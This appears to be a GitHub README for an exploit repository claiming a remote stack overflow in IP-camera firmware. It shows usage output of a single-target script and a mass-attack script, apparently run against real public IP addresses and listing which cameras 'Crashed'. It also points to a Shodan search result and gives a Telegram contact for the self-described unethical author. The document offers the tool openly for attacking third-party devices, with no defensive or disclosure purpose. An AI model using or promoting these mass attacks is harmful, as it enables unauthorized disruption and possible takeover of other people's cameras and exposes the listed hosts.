# Multiple ip-cameras remote stack overflow
Stack overflow through authorization request in the system. Code execution is possible. This vulnerability is present in many camera manufacturers that use this firmware. Perhaps the vulnerability was found before me, but I have not heard anything about this vulnerability

# Usage exp.py:
```root@kali:~/ipcam-overflow# python3 exp.py 177.139.57.124 8181
[*]Stack overflow in ip-cameras xD
[i]Exploit created and tested by @NotEth1calHack3r

[i]Checking: 177.139.57.124
[✓]Online!
[=]Connecting
[>]Sending payload
[✓]Crashed :/
```

# Usage masspwn3r.py:
```root@kali:~/ipcam-overflow# python3 masspwn3r.py list.txt 8081
[*]Mass stack overflow in ip-cameras :0
[i]Exploit created and tested by @NotEth1calHack3r

[×]Offline 115.22.84.200
[×]Offline 121.141.117.218
[i]Not vulnerable 96.232.177.2
[i]Not vulnerable 121.121.80.6
[i]Not vulnerable 121.121.80.6
[✓]Crashed 177.188.38.102
[✓]Crashed 177.180.202.171
[×]Offline 211.194.40.166
[×]Offline 59.31.186.119
[i]Not vulnerable 68.107.121.55
[✓]Crashed 191.13.13.214
```

# Demo:

![alt text](https://raw.githubusercontent.com/NotEth1calHack3r/ipcam-mass_overflow/master/Screencast_12-01-2019_05_27_05%20PM.gif)

# Shodan result:
![alt text](https://raw.githubusercontent.com/NotEth1calHack3r/ipcam-mass_overflow/master/157521038127974614.png)
1/3 or 1/2 vulnerable

# Contacts:
Telegram:```@eth_hacker0x18```
